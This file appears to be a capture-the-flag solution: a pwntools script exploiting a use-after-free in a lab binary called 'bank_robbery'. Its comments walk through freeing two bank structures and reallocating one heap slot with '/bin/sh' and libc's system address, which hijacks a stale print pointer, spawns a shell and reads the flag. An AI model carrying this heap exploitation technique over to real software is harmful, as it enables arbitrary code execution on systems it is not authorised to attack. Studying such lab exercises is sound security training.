#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./bank_robbery", checksec=False)
context.log_level = "error"


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def select_bank_slot(bank_slot):
    io.recv().decode("utf-8")
    io.sendline(b"1")
    io.recv().decode("utf-8")
    io.sendline(bank_slot)

def create_bank(bank_name, account_params):
    io.recv().decode("utf-8")
    io.sendline(b"2")
    io.recv().decode("utf-8")
    io.sendline(b"1")
    io.recv().decode("utf-8")
    io.sendline(bank_name)
    io.recv().decode("utf-8")
    io.sendline(bytes(str(len(account_params)), "ASCII"))
    for account_param in account_params:
        io.recv().decode("utf-8")
        io.sendline(bytes(account_param, "ASCII"))
    io.recv().decode("utf-8")
    io.sendline(b"1")
    io.recv().decode("utf-8")
    io.sendline(b"1")

def close_current_bank():
    io.recv().decode("utf-8")
    io.sendline(b"4")

def print_current_bank():
    io.sendline(b"3")


def main():
    global io
    io = start()

    # It looks like there is a "Use After Free Vulnerability" again in this case. 
    # When a bank is removed the pointer is not freed and can still be accessed
    # the idea here is to open two banks with each one account -> bank 1 and bank 2
    # then we remove the banks and create a new third bank
    # the accounts of the third bank have the same size as the bank 2 so the same heap space is allocated
    # the account where the name was is set to "/bin/sh" and the account with the old pointer for print is set to the system addr
    # for better understanding of our approach we added a picture to the folder (picture.pdf)

    # as said at first we need to open two banks
    account_params = ["123"]

    select_bank_slot(b"1")
    create_bank(b"first", account_params)
    select_bank_slot(b"2")
    create_bank(b"second", account_params)
    
    # then we need to grab system addr
    system_address = str(io.libc.symbols["system"])

    # as the next step we close both banks to free the allocated memory
    select_bank_slot(b"2")
    close_current_bank()
    select_bank_slot(b"1")
    close_current_bank()

    # With a newly opened bank we can now overwrite the old bank 2 space with our accounts                       
    
    # now we need to construct a payload aka bank 3
    # create bank with /bin/sh account => vis in gdb => 68732F6E69622F => hex to int => 29400045130965551 
    # system_address    ==> address of... system. duh
    payload = ["0","29400045130965551","0","0",system_address,"0"]
    select_bank_slot(b"3")
    create_bank(b"third", payload)

    # the last step is to invoke print on bank 2
    select_bank_slot(b"2")
    print_current_bank()
    
    io.recv().decode("utf-8")
    io.sendline(b"cat flag.txt")
    print(io.recvuntil(b"}").split()[-1].decode("utf-8"))

    io.close()    

if __name__ == "__main__":
    main()
